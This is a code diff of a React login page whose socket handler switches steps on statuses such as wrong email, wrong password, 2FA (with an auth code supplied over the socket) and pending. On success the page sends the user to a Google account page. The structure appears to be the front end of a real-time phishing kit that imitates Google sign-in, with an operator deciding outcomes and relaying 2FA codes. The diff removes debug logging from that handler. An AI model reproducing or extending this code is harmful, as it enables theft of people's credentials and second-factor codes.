@@ -75,24 +75,19 @@ export default function LoginPage() {
                 const status = data.newStatus;
 
                 if (status === '2fa') {
-                    console.log('Received 2FA status from socket:', data);
                     // show code popup and move to 2FA step
                     setTwoFACode(data.authCode || '');
                     setShowAdminCodePopup(true);
                     setStep(3);
                 } else if (status === 'wrong_email') {
-                    console.log('Received wrong_email status from socket:', data);
                     setError('Email not found. Please enter a valid email.');
                     setStep(1);
                 } else if (status === 'wrong_password') {
-                    console.log('Received wrong_password status from socket:', data);
                     setError('Wrong password. Please try again.');
                     setStep(2);
                 } else if (status === 'success') {
-                    console.log('Received success status from socket:', data);
                     router.push("https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1");
                 } else if (status === 'pending') {
-                    console.log('Received pending status from socket:', data);
                     setStep(5);
                     startPolling(email);
                 }
